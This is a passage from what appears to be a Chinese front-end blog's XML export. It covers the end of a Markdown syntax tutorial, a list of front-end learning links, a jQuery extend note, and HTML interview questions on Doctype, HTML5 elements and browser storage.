class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe height=498 width=510 src=&apos;http://player.youku.com/embed/XMjgzNzM0NTYxNg==&apos; frameborder=0 &apos;allowfullscreen&apos;&gt;&lt;/iframe&gt;</span><br></pre></td></tr></table></figure></iframe></p></blockquote><p><strong>代码2</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">[![](./youku2.png)](http://v.youku.com/v_show/id_XMjgzNzM0NTYxNg==.html?spm=a2htv.20009910.contentHolderUnit2.A&from=y1.3-tv-grid-1007-9910.86804.1-2#paction){:target="_blank"}</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="11-序表"><a href="#11-序表" class="headerlink" title="11.序表"></a>11.序表</h4><p><strong>代码1(有序)</strong>  </p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">1. one</span><br><span class="line">2. two</span><br><span class="line">3. three</span><br></pre></td></tr></tbody></table></figure><h4 id="演示-13"><a href="#演示-13" class="headerlink" title="演示"></a>演示</h4><ol><li>one</li><li>two</li><li>three</li></ol><p><strong>代码2(无序)</strong>  </p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">* one</span><br><span class="line">* two</span><br><span class="line">* three</span><br></pre></td></tr></tbody></table></figure><h4 id="演示-14"><a href="#演示-14" class="headerlink" title="演示"></a>演示</h4><ul><li>one</li><li>two</li><li>three</li></ul><p><strong>代码3(序表嵌套)</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. one</span><br><span class="line">    1. one-1</span><br><span class="line">    2. two-2</span><br><span class="line">2. two</span><br><span class="line">    * two-1</span><br><span class="line">    * two-2</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="演示-15"><a href="#演示-15" class="headerlink" title="演示"></a>演示</h4><ol><li>one<ol><li>one-1</li><li>two-2</li></ol></li><li>two<ul><li>two-1</li><li>two-2</li></ul></li></ol><p><strong>代码4(序表嵌套代码块)</strong></p><blockquote><p>注: 换行+两个Tab<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">* one</span><br><span class="line">    var a = 10; //与上行保持空行并递归缩进</span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><h4 id="演示-16"><a href="#演示-16" class="headerlink" title="演示"></a>演示</h4><ul><li><p>one </p><pre><code>var a = 10;     //与上行保持空行并递归缩进</code></pre></li></ul><h4 id="12-任务列表"><a href="#12-任务列表" class="headerlink" title="12.任务列表"></a>12.任务列表</h4><blockquote><p>注：兼容性一般 要隔开一行<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这是文字……</span><br><span class="line"></span><br><span class="line">- [x] 选项一</span><br><span class="line">- [ ] 选项二  </span><br><span class="line">- [ ]  [选项3]</span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><h4 id="演示-17"><a href="#演示-17" class="headerlink" title="演示"></a>演示</h4><ul><li style="list-style: none"><input type="checkbox" checked> 选项一</li><li style="list-style: none"><input type="checkbox"> 选项二  </li><li><p>[ ]  [选项3]</p><h4 id="13-表情"><a href="#13-表情" class="headerlink" title="13.表情"></a>13.表情</h4><blockquote><p>注：兼容一般</p></blockquote><h4 id="14-表格"><a href="#14-表格" class="headerlink" title="14.表格"></a>14.表格</h4><blockquote><p>注：: 代表对齐方式 ,<strong> : 与 | 之间不要有空格</strong>，否则对齐会有些不兼容</p></blockquote></li></ul><p><strong>代码1</strong>  </p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">| a | b | c | </span><br><span class="line">|:-------:|:------------- | ----------:| </span><br><span class="line">| 居中 | 左对齐 | 右对齐 |</span><br><span class="line">|=========|===============|============|</span><br></pre></td></tr></tbody></table></figure><h4 id="演示-18"><a href="#演示-18" class="headerlink" title="演示"></a>演示</h4><table><thead><tr><th style="text-align:center">a</th><th style="text-align:left">b</th><th style="text-align:right">c</th></tr></thead><tbody><tr><td style="text-align:center">居中</td><td style="text-align:left">左对齐</td><td style="text-align:right">右对齐</td></tr><tr><td style="text-align:center">=========</td><td style="text-align:left">===============</td><td style="text-align:right">============</td></tr></tbody></table><p><strong>代码2(简约写法)</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">a  | b | c  </span><br><span class="line">:-:|:- |-:</span><br><span class="line">    居中    |     左对齐      |   右对齐    </span><br><span class="line">============|=================|=============</span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="演示-19"><a href="#演示-19" class="headerlink" title="演示"></a>演示</h4><table><thead><tr><th style="text-align:center">a</th><th style="text-align:left">b</th><th style="text-align:right">c  </th></tr></thead><tbody><tr><td style="text-align:center">    居中</td><td style="text-align:left">左对齐</td><td style="text-align:right">右对齐    </td></tr><tr><td style="text-align:center">============</td><td style="text-align:left">=================</td><td style="text-align:right">=============</td></tr></tbody></table><p><strong>代码3(特殊表格)</strong>  </p><blockquote><p>注: 一般对合并单元格，以及其他特殊格式表格，markdown 是无能为力的<br> 所以常规的做法是使用HTML标签，但是这样的编写效率极低。<br> 但是有了这款工具的话，所有问题都迎刃而解. </p></blockquote><blockquote><p>在线生成HTML代码 Tables Generator (国外的站)</p></blockquote><h4 id="15-支持内嵌的CSS样式"><a href="#15-支持内嵌的CSS样式" class="headerlink" title="15.支持内嵌的CSS样式"></a>15.支持内嵌的CSS样式</h4><p> <strong>代码</strong><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><p style="color: #AD5D0F;font-size: 30px; font-family: '宋体';">内联样式</p></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="演示-20"><a href="#演示-20" class="headerlink" title="演示"></a>演示</h4><p style="color: #AD5D0F;font-size: 30px; font-family: '宋体';">内联样式</p><h4 id="16-语义标记"><a href="#16-语义标记" class="headerlink" title="16.语义标记"></a>16.语义标记</h4><table><thead><tr><th>描述</th><th>效果</th><th>代码</th></tr></thead><tbody><tr><td>斜体</td><td><em>斜体</em></td><td><code>*斜体*</code></td></tr><tr><td>斜体</td><td>_斜体_</td><td><code>_斜体_</code></td></tr><tr><td>加粗</td><td><strong>加粗</strong></td><td><code>**加粗**</code></td></tr><tr><td>加粗+斜体</td><td><strong><em>加粗+斜体</em></strong></td><td><code>***加粗+斜体***</code></td></tr><tr><td>加粗+斜体</td><td><strong><em>加粗+斜体</em></strong></td><td><code>**_加粗+斜体_**</code></td></tr><tr><td>删除线</td><td><del>删除线</del></td><td><code>~~删除线~~</code></td></tr></tbody></table><h4 id="17-语义标签"><a href="#17-语义标签" class="headerlink" title="17.语义标签"></a>17.语义标签</h4><table><thead><tr><th>描述</th><th>效果</th><th>代码</th></tr></thead><tbody><tr><td>斜体</td><td><i>斜体</i></td><td><code><i>斜体</i></code></td></tr><tr><td>加粗</td><td><b>加粗</b></td><td><code><b>加粗</b></code></td></tr><tr><td>强调</td><td><em>强调</em></td><td><code><em>强调</em></code></td></tr><tr><td>上标</td><td>Z<sup>a</sup></td><td><code>Z<sup>a</sup></code></td></tr><tr><td>下标</td><td>Z<sub>a</sub></td><td><code>Z<sub>a</sub></code></td></tr><tr><td>键盘文本</td><td><kbd>Ctrl</kbd></td><td><code><kbd>Ctrl</kbd></code></td></tr><tr><td>换行</td><td></td><td><code></code></td></tr></tbody></table><h4 id="18-格式化文本"><a href="#18-格式化文本" class="headerlink" title="18.格式化文本"></a>18.格式化文本</h4><p> <strong>保持输入排版格式不变</strong>  </p><p>  <strong>代码</strong><br>  </p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"> <pre></span><br><span class="line">hello world </span><br><span class="line">         hi</span><br><span class="line">  hello world </span><br><span class="line"> </pre></span><br></pre></td></tr></tbody></table></figure><p></p><h4 id="演示-21"><a href="#演示-21" class="headerlink" title="演示"></a>演示</h4><pre>hello world          hi  hello world </pre><p><strong>错误解决方法</strong> </p><blockquote><p>注: 标签内部添加空格 或者 <b>直接使用</b></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**代码1(插入空格)** </span><br><span class="line"></span><br><span class="line">**演示**</span><br><span class="line"><pre></span><br><span class="line">    < div>   </span><br><span class="line">        < div>< /div></span><br><span class="line">        < div>< /div></span><br><span class="line">        < div>< /div></span><br><span class="line">    < /div></span><br><span class="line"></pre></span><br><span class="line"></span><br><span class="line">#### 19.公式 {#1}</span><br><span class="line"> > 注: 1个$左对齐，2个居中  </span><br><span class="line"></span><br><span class="line"> **代码**</span><br></pre></td></tr></tbody></table></figure><p></p></blockquote><p>$$ x \href{why-equal.html}{=} y^2 + 1 $$<br>$ x = {-b \pm \sqrt{b^2-4ac} \over 2a}. $<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">**演示**</span><br><span class="line"></span><br><span class="line">$$ x \href{why-equal.html}{=} y^2 + 1 $$  </span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$ x = {-b \pm \sqrt{b^2-4ac} \over 2a}. $</span><br><span class="line"></span><br><span class="line">#### 20.分隔符</span><br><span class="line">  > 注: 最少三个 --- 或 ***或 * * *  </span><br><span class="line"></span><br><span class="line"> **代码**</span><br></pre></td></tr></tbody></table></figure><p></p><hr><hr><hr> <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">**演示**  </span><br><span class="line">***</span><br><span class="line">---</span><br><span class="line">* * *</span><br><span class="line"></span><br><span class="line">#### 21.脚注</span><br><span class="line">**代码**</span><br></pre></td></tr></tbody></table></figure><p>Markdown[^1]<br>[^1]: Markdown是一种纯文本标记语言  //在文章最后面显示脚注</p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">**演示** </span><br><span class="line"></span><br><span class="line">Markdown[^1]  </span><br><span class="line"></span><br><span class="line">[^1]: Markdown是一种纯文本标记语言</span><br><span class="line">#### 22.锚点</span><br><span class="line">**代码** </span><br><span class="line">> 注: 只有标题支持锚点， 跳转目录方括号后 保持空格</span><br><span class="line"></span><br><span class="line">#### 23.定义型列表</span><br><span class="line">> 注: 解释型定义</span><br></pre></td></tr></tbody></table></figure><p>Markdown<br>:   轻量级文本标记语言，可以转换成html，pdf等格式  //  开头一个<code>:</code> + <code>Tab</code> 或 四个空格</p><p>代码块定义<br>:   代码块定义……<br>        var a = 10;         // 保持空一行与 递进缩进<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">**演示**  </span><br><span class="line"></span><br><span class="line">Markdown </span><br><span class="line">:   轻量级文本标记语言，可以转换成html，pdf等格式  //  开头一个`:` + `Tab` 或 四个空格</span><br><span class="line"></span><br><span class="line">代码块定义</span><br><span class="line">:   代码块定义…… </span><br><span class="line">​    </span><br><span class="line">        var a = 10;  </span><br><span class="line"></span><br><span class="line">#### 24.自动邮箱链接 </span><br><span class="line">**代码**</span><br></pre></td></tr></tbody></table></figure><p></p><p><a href="mailto:xxx@outlook.com" target="_blank" rel="noopener">xxx@outlook.com</a><br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">**演示** </span><br><span class="line"></span><br><span class="line"><xxx@outlook.com> </span><br><span class="line"></span><br><span class="line">#### 25.流程图</span><br><span class="line">**代码**</span><br></pre></td></tr></tbody></table></figure><p></p><p>flow // 流程<br>st=>start: 开始|past:> <a href="http://www.baidu.com" target="_blank" rel="noopener">http://www.baidu.com</a> // 开始 e=>end: 结束    // 结束<br>c1=>condition: 条件1:><a href="http://www.baidu.com[_parent]//判断条件" target="_blank" rel="noopener">http://www.baidu.com[_parent]//判断条件</a> c2=>condition: 条件2   // 判断条件<br>c3=>condition: 条件3        // 判断条件<br>io=>inputoutput: 输出      // 输出<br>//—————-以上为定义参数————————-</p><p>//—————-以下为连接参数————————-<br>// 开始->判断条件1为no->判断条件2为no->判断条件3为no->输出->结束<br>st->c1(yes,right)->c2(yes,right)->c3(yes,right)->io->e c1(no)->e // 条件1不满足->结束<br>c2(no)->e // 条件2不满足->结束<br>c3(no)->e // 条件3不满足->结束 </p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">#### 26.时序图</span><br><span class="line">**代码**</span><br></pre></td></tr></tbody></table></figure><p>sequence<br>A->>B: 你好<br>Note left of A: 我在左边     // 注释方向，只有左右，没有上下<br>Note right of B: 我在右边<br>B–>A: 很高兴认识你<br><code>`</code></p><h4 id="27-生成侧边栏扩展"><a href="#27-生成侧边栏扩展" class="headerlink" title="27.生成侧边栏扩展"></a>27.生成侧边栏扩展</h4><p><strong>代码</strong> </p><blockquote><p>注: 生成侧边栏一般是插入JS，再就是模板,<br>总体来说，很是麻烦，效果一般，不作详解。</p></blockquote><blockquote><p>作者仓库：i5ting_ztree_toc</p></blockquote><hr><h3 id="END"><a href="#END" class="headerlink" title="END"></a>END</h3><hr></body></html>]]></content>
      
      
      <categories>
          
          <category> markdown </category>
          
      </categories>
      
      
        <tags>
            
            <tag> markdown </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>前端学习资料</title>
      <link href="/2018/05/06/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/"/>
      <url>/2018/05/06/%E5%89%8D%E7%AB%AF%E5%AD%A6%E4%B9%A0%E8%B5%84%E6%96%99/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><ol><li>前端知识结构 <a href="https://github.com/JacksonTian/fks" target="_blank" rel="noopener">https://github.com/JacksonTian/fks</a></li><li>前端入门：<a href="https://github.com/qiu-deqing/FE-learning" target="_blank" rel="noopener">https://github.com/qiu-deqing/FE-learning</a></li><li>博客：<ul><li><a href="https://www.xuanfengge.com" target="_blank" rel="noopener">https://www.xuanfengge.com</a></li><li><a href="https://www.w3cplus.com/" target="_blank" rel="noopener">https://www.w3cplus.com/</a></li><li><a href="https://www.w3ctech.com/" target="_blank" rel="noopener">https://www.w3ctech.com/</a></li><li><a href="http://www.css88.com/" target="_blank" rel="noopener">http://www.css88.com/</a></li><li><a href="https://www.qianduan.net/" target="_blank" rel="noopener">https://www.qianduan.net/</a></li><li><a href="http://www.ruanyifeng.com/blog/" target="_blank" rel="noopener">http://www.ruanyifeng.com/blog/</a></li><li><a href="http://javascript.ruanyifeng.com/" target="_blank" rel="noopener">http://javascript.ruanyifeng.com/</a></li><li><a href="http://es6.ruanyifeng.com/" target="_blank" rel="noopener">http://es6.ruanyifeng.com/</a></li></ul></li><li>书籍：<a href="https://www.xuanfengge.com/fe-books.html" target="_blank" rel="noopener">https://www.xuanfengge.com/fe-books.html</a></li><li><p>公司前端团队</p><ul><li>腾讯 AlloyTeam <a href="http://www.alloyteam.com/" target="_blank" rel="noopener">http://www.alloyteam.com/</a></li><li>百度fex <a href="http://fex.baidu.com/" target="_blank" rel="noopener">http://fex.baidu.com/</a></li><li>百度efe <a href="http://efe.baidu.com/" target="_blank" rel="noopener">http://efe.baidu.com/</a></li><li>淘宝FED <a href="http://taobaofed.org/" target="_blank" rel="noopener">http://taobaofed.org/</a></li><li>去哪儿UED <a href="http://ued.qunar.com/" target="_blank" rel="noopener">http://ued.qunar.com/</a></li><li>奇舞团 <a href="https://75team.com/" target="_blank" rel="noopener">https://75team.com/</a></li></ul></li><li><p>开源项目</p><ul><li>Facebook Projects <a href="https://code.facebook.com/projects/web/" target="_blank" rel="noopener">https://code.facebook.com/projects/web/</a></li><li>百度fex <a href="https://github.com/fex-team/" target="_blank" rel="noopener">https://github.com/fex-team/</a></li><li>efe <a href="https://github.com/ecomfe" target="_blank" rel="noopener">https://github.com/ecomfe</a></li><li>alloyteam-github <a href="http://alloyteam.github.io/" target="_blank" rel="noopener">http://alloyteam.github.io/</a></li><li>underscore源码解读 <a href="https://github.com/hanzichi/underscore-analysis" target="_blank" rel="noopener">https://github.com/hanzichi/underscore-analysis</a></li><li>vue源码学习 <a href="https://github.com/answershuto/learnVue" target="_blank" rel="noopener">https://github.com/answershuto/learnVue</a></li></ul></li></ol><p>前端学习资源汇总：<a href="https://jeffjade.com/2016/03/30/104-front-end-tutorial/" target="_blank" rel="noopener">https://jeffjade.com/2016/03/30/104-front-end-tutorial/</a></p></body></html>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 前端资料 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>JQuery</title>
      <link href="/2018/05/06/JQuery%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/"/>
      <url>/2018/05/06/JQuery%E9%9D%A2%E8%AF%95%E9%A2%98%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="1-jQuery-extend-和jQuery-fn-extend"><a href="#1-jQuery-extend-和jQuery-fn-extend" class="headerlink" title="==1. jQuery extend()和jQuery.fn.extend()=="></a>==1. jQuery extend()和jQuery.fn.extend()==</h3><ol><li><p>两者调用方式不同：</p><pre><code>jQuery.extend(),一般由传入的全局函数来调用，主要是用来拓展个全局函数，如$.init()，$.ajax();jQuery.fn.extend(),一般由具体的实例对象来调用，可以用来拓展个选择器，例如$.fn.each();</code></pre></li><li><p>两者的主要功能作用不同：</p><pre><code>jQuery.extend(object); 为扩展jQuery类本身，为自身添加新的方法。jQuery.fn.extend(object);给jQuery对象添加方法</code></pre></li><li><p>大部分插件都是用jQuery.fn.extend()</p></li></ol></body></html>]]></content>
      
      
      <categories>
          
          <category> 前端 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Jquery </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>html简述</title>
      <link href="/2018/05/06/HTML%E9%9D%A2%E8%AF%95%E9%A2%98/"/>
      <url>/2018/05/06/HTML%E9%9D%A2%E8%AF%95%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<html><head></head><body><h3 id="1-HTML的Doctype作用-严格模式与混杂模式如何区分？它们有何意义"><a href="#1-HTML的Doctype作用-严格模式与混杂模式如何区分？它们有何意义" class="headerlink" title="1. HTML的Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?"></a>1. HTML的Doctype作用? 严格模式与混杂模式如何区分？它们有何意义?</h3><p><!DOCTYPE>  声明位于文档中的最前面的位置，处于     标签之前。此标签可告知浏览器文档使用哪种   HTML  或   XHTML  规范。<br>所谓的标准模式是指，浏览器按 W3C 标准解析执行代码；怪异模式则是使用浏览器自己的方式解析执行代码，因为不同浏览器解析执行的方式不一样，所以我们称之为怪异模式。<br>浏览器解析时到底使用标准模式还是怪异模式，与你网页中的 DTD 声明直接相关， DTD 声明定义了标准文档的类型（标准模式解析）文档类型，会使浏览器使用相应的方式加载网页并显示，忽略 DTD 声明 , 将使网页进入怪异模式。</p><h3 id="2-简述document-write和-innerHTML的区别。"><a href="#2-简述document-write和-innerHTML的区别。" class="headerlink" title="2. 简述document.write和 innerHTML的区别。"></a>2. 简述document.write和 innerHTML的区别。</h3><p>document.write只能重绘整个页面, innerHTML可以重绘页面的一部分。</p><h3 id="3-浏览器页面有哪三层构成，分别是什么，作用是什么？"><a href="#3-浏览器页面有哪三层构成，分别是什么，作用是什么？" class="headerlink" title="3. 浏览器页面有哪三层构成，分别是什么，作用是什么？"></a>3. 浏览器页面有哪三层构成，分别是什么，作用是什么？</h3><p>构成：结构层、表示层、行为层<br>分别是：HTML、CSS、JavaScript<br>作用：HTML实现页面结构，CSS完成页面的表现与风格，JavaScript实现一些客户端的功能与业务。</p><h3 id="4-HTML5有哪些新特性、移除了哪些元素？"><a href="#4-HTML5有哪些新特性、移除了哪些元素？" class="headerlink" title="4. HTML5有哪些新特性、移除了哪些元素？"></a>4. HTML5有哪些新特性、移除了哪些元素？</h3><p>Html5新增了 27 个元素，废弃了 16 个元素，根据现有的标准规范，把HTML5的元素按优先级定义为结构性属性、级块性元素、行内语义性元素和交互性元素 4 大类。<br>结构性元素主要负责web上下文结构的定义</p><ul><li>section：在 web 页面应用中，该元素也可以用于区域的章节描述。</li><li>header：页面主体上的头部， header 元素往往在一对 body 元素中。</li><li>footer：页面的底部（页脚），通常会标出网站的相关信息。</li><li>nav：专门用于菜单导航、链接导航的元素，是 navigator 的缩写。</li><li>article：用于表现一篇文章的主体内容，一般为文字集中显示的区域。</li><li>级块性元素主要完成web页面区域的划分，确保内容的有效分割。</li><li>aside：用于表达注记、贴士、侧栏、摘要、插入的引用等作为补充主体的内容。</li><li>figure：是对多个元素进行组合并展示的元素，通常与 ficaption 联合使用。</li><li>code：表示一段代码块。</li><li>dialog：用于表达人与人之间的对话，该元素包含 dt 和 dd 这两个组合元素， dt 用于表示说话者，而 dd 用来表示说话内容。</li><li>行内语义性元素主要完成web页面具体内容的引用和描述，是丰富内容展示的基础。</li><li>meter：表示特定范围内的数值，可用于工资、数量、百分比等。</li><li>time：表示时间值。</li><li>progress：用来表示进度条，可通过对其 max 、 min 、 step 等属性进行控制，完成对进度的表示和监事。</li><li>video：视频元素，用于支持和实现视频文件的直接播放，支持缓冲预载和多种视频媒体格式。</li><li>audio：音频元素，用于支持和实现音频文件的直接播放，支持缓冲预载和多种音频媒体格式。</li><li>交互性元素主要用于功能性的内容表达，会有一定的内容和数据的关联，是各种事件的基础。</li><li>details：用来表示一段具体的内容，但是内容默认可能不显示，通过某种手段（如单击）与 legend 交互才会显示出来。</li><li>datagrid：用来控制客户端数据与显示，可以由动态脚本及时更新。</li><li>menu：主要用于交互菜单（曾被废弃又被重新启用的元素）。</li><li>command：用来处理命令按钮。<h3 id="5-你做的网页在哪些流览器测试过-这些浏览器的内核分别是什么"><a href="#5-你做的网页在哪些流览器测试过-这些浏览器的内核分别是什么" class="headerlink" title="==5. 你做的网页在哪些流览器测试过,这些浏览器的内核分别是什么?=="></a>==5. 你做的网页在哪些流览器测试过,这些浏览器的内核分别是什么?==</h3></li><li>IE : trident 内核</li><li>Firefox ： gecko 内核</li><li>Safari : webkit 内核</li><li>Opera : 以前是 presto 内核， Opera 现已改用 Google Chrome 的 Blink 内核</li><li>Chrome : Blink( 基于 webkit ， Google 与 Opera Software 共同开发 )</li></ul><h3 id="6-对WEB标准以及W3C的理解与认识"><a href="#6-对WEB标准以及W3C的理解与认识" class="headerlink" title="6. 对WEB标准以及W3C的理解与认识?"></a>6. 对WEB标准以及W3C的理解与认识?</h3><p>标签闭合、标签小写、不乱嵌套、提高搜索机器人搜索几率、使用外链css和 js 脚本、结构行为表现的分离、<br>文件下载与页面速度更快、内容能被更多的用户所访问、内容能被更广泛的设备所访问、更少的代码和组件，<br>容易维护、改版方便，不需要变动页面内容、提供打印版本而不需要复制内容、提高网站易用性。</p><h3 id="7-HTML5行内元素有哪些-块级元素有哪些-空元素有哪些"><a href="#7-HTML5行内元素有哪些-块级元素有哪些-空元素有哪些" class="headerlink" title="7. HTML5行内元素有哪些,块级元素有哪些, 空元素有哪些?"></a>7. HTML5行内元素有哪些,块级元素有哪些, 空元素有哪些?</h3><p>(1)行内元素</p><ul><li>a - 锚点</li><li>abbr - 缩写</li><li>acronym - 首字</li><li>b - 粗体 ( 不推荐 )</li><li>bdo - bidi override</li><li>big - 大字体</li><li>br - 换行</li><li>cite - 引用</li><li>code - 计算机代码 ( 在引用源码的时候需要 )</li><li>dfn - 定义字段</li><li>em - 强调</li><li>font - 字体设定 ( 不推荐 )</li><li>i - 斜体</li><li>img - 图片</li><li>input - 输入框</li><li>kbd - 定义键盘文本</li><li>label - 表格标签</li><li>q - 短引用</li><li>s - 中划线 ( 不推荐 )</li><li>samp - 定义范例计算机代码</li><li>select - 项目选择</li><li>small - 小字体文本</li><li>span - 常用内联容器，定义文本内区块</li><li>strike - 中划线</li><li>strong - 粗体强调</li><li>sub - 下标</li><li>sup - 上标</li><li>textarea - 多行文本输入框</li><li>tt - 电传文本</li><li>u - 下划线</li><li>var - 定义变量</li></ul><p>(2)块元素 (block element)</p><ul><li>address - 地址</li><li>blockquote - 块引用</li><li>center - 举中对齐块</li><li>dir - 目录列表</li><li>div - 常用块级容易，也是 css layout 的主要标签</li><li>dl - 定义列表</li><li>fieldset - form控制组</li><li>form - 交互表单</li><li>h3 - 大标题</li><li>h4 - 副标题</li><li>h3 - 3级标题</li><li>h4 - 4级标题</li><li>h5 - 5级标题</li><li>h6 - 6级标题</li><li>hr - 水平分隔线</li><li>isindex - input prompt</li><li>menu - 菜单列表</li><li>noframes - frames可选内容，（对于不支持 frame 的浏览器显示此区块内容</li><li>noscript - ）可选脚本内容（对于不支持 script 的浏览器显示此内容）</li><li>ol - 排序表单</li><li>p - 段落</li><li>pre - 格式化文本</li><li>table - 表格</li><li>ul - 非排序列表<br>可变元素<br>可变元素为根据上下文语境决定该元素为块元素或者内联元素。</li><li>applet - java applet</li><li>button - 按钮</li><li>del - 删除文本</li><li>iframe - inline frame</li><li>ins - 插入的文本</li><li>map - 图片区块 (map)</li><li>object - object对象</li><li>script - 客户端脚本</li></ul><p>(3)空元素 ( 在 HTML[1] 元素中，没有内容的 HTML 元素被称为空元素 )</p><ul><li><br> //换行</li><li><hr> //分隔线</li><li><input> //文本框等</li><li><img> //图片</li><li><link> <meta></li></ul><h3 id="8-请你描述一下-cookies，sessionStorage-和-localStorage-的区别"><a href="#8-请你描述一下-cookies，sessionStorage-和-localStorage-的区别" class="headerlink" title="8. 请你描述一下 cookies，sessionStorage 和 localStorage 的区别?"></a>8. 请你描述一下 cookies，sessionStorage 和 localStorage 的区别?</h3><p>sessionStorage 和 localStorage 是 HTML5 Web Storage API 提供的，可以方便的在 web 请求之间保存数据。有了本地数据，就可以避免数据在浏览器和服务器间不必要地来回传递。</p><p>sessionStorage、 localStorage 、 cookie 都是在浏览器端存储的数据，其中 sessionStorage 的概念很特别，引入了一个“浏览器窗口”的概念。 sessionStorage 是在同源的同窗口（或tab）中，始终存在的数据。也就是说只要这个浏览器窗口没有关闭，即使刷新页面或进入同源另一页面，数据仍然存在。关闭窗口后， sessionStorage 即被销毁。同时“独立”打开的不同窗口，即使是同一页面， sessionStorage 对象也是不同的</p><p>cookies会发送到服务器端。其余两个不会。</p><p>Microsoft 指出 Internet Explorer 8 增加 cookie 限制为每个域名 50 个，但 IE7 似乎也允许每个域名 50 个 cookie 。 Firefox 每个域名 cookie 限制为 50 个。 Opera 每个域名 cookie 限制为 30 个。 Firefox 和 Safari 允许 cookie 多达 4097 个字节，包括名（ name ）、值（ value ）和等号。 Opera 许 cookie 多达 4096 个字节，包括：名（ name ）、值（ value ）和等号。 Internet Explorer 允许 cookie 多达 4095 个字节，包括：名（ name ）、值（ value ）和等号。<br>区别：</p><p>Cookie</p><ul><li>每个域名存储量比较小（各浏览器不同，大致 4K ）</li><li>所有域名的存储量有限制（各浏览器不同，大致 4K ）</li><li>有个数限制（各浏览器不同）</li><li>会随请求发送到服务器</li></ul><p>LocalStorage</p><ul><li>永久存储</li><li>单个域名存储量比较大（推荐 5MB ，各浏览器不同）</li><li>总体数量无限制</li></ul><p>SessionStorage</p><ul><li>只在 Session 内有效</li><li>存储量更大（推荐没有限制，但是实际上各浏览器也不同）</li></ul><h3 